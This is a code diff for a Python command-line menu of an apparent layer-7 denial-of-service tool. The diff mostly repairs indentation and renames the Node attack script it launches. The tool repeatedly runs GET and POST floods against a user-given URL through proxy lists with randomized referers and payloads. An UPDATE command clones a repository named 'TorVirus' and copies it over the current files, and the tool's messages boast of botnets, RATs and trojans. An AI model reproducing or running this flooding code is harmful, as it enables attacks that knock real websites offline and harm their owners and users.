@@ -93,11 +93,9 @@ def ani_txt(text, delay=0.05, end_line=True):
 
 
 def ran_txt():
-
-
-msg = [
-    "🧟‍♂️ Deploying Zombie Bots for Total Infiltration...",
-    "💀 Spreading Viral Agents Through Hidden Tunnels...",
+    msg = [
+        "🧟‍♂️ Deploying Zombie Bots for Total Infiltration...",
+            "💀 Spreading Viral Agents Through Hidden Tunnels...",
     "💥 Unleashing Undetectable RAT Infections...",
     "🔥 Raising the Dead with Backdoor Access...",
     "💨 Accelerating Infection Spread Across Targets...",
@@ -191,13 +189,11 @@ msg = [
     "⚡ Raising Trojans for Stealthy Network Penetration...",
     "🧠 Optimizing Remote Access for Strategic Control...",
     "🔥 Spreading Malware Agents for Global Impact...",
-    "🧟‍♀️ Turning Networks into Zombie Hordes for Control...",
-]
-
+    "🧟‍♀️ Turning Networks into Zombie Hordes for Control..."
+    ]
     slt_txt = r.choice(msg)
     load_ani("Processing", 1.5)
     ani_txt(slt_txt)
-
 
 def ses_dur():
     return t.time() - ses_srt
@@ -218,8 +214,9 @@ def main_loop():
             continue
 
         elif command == "LAYER7":
-    load_ani("✨ Loading Layer 7 Methods ✨", 1.5)
-    print('''
+            load_ani("✨ Loading Layer 7 Methods ✨", 1.5)
+            print('''
+
 ━━━━━━━━━━━ Layer 7 Methods ━━━━━━━━━━━
 
     TOR: TOR https://example.com 60
@@ -231,8 +228,10 @@ def main_loop():
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         ⚠️ Use Responsibly! ⚠️
+        
 ''')
-        continue
+            continue
+
 
         elif command in ["CLEAR", "CLS"]:
             load_ani("Purging Console", 1.5)
@@ -257,9 +256,9 @@ def main_loop():
 
                 while t.time() - start_time < time:
                     o.system(
-    f'node bin/odd/.cache/TOR.js GET "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+    f'node bin/odd/.cache/TorXTor.js GET "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                     o.system(
-    f'node bin/odd/.cache/TOR.js POST "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+    f'node bin/odd/.cache/TorXTor.js POST "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                     t.sleep(1)
 
             except IndexError:
@@ -312,7 +311,7 @@ def main_loop():
                 print('❌ Invalid Command. Usage: METHOD URL TIME')
                 print('Example: TOR https://example.com 60')
 
- elif command == "TLS":
+        elif command == "TLS":
             try:
                 host = parts[1]
                 time = int(parts[2])
@@ -409,7 +408,7 @@ def main_loop():
 
         elif command == "UPDATE":
            o.system('git clone https://github.com/FrostFoe/TorVirus.git --depth 1 --force && cp -r TorVirus/* . && rm -rf TorVirus')
-          continue
+           continue
 
         elif command == "SETUP":
             o.system('sudo bash setup.sh &')
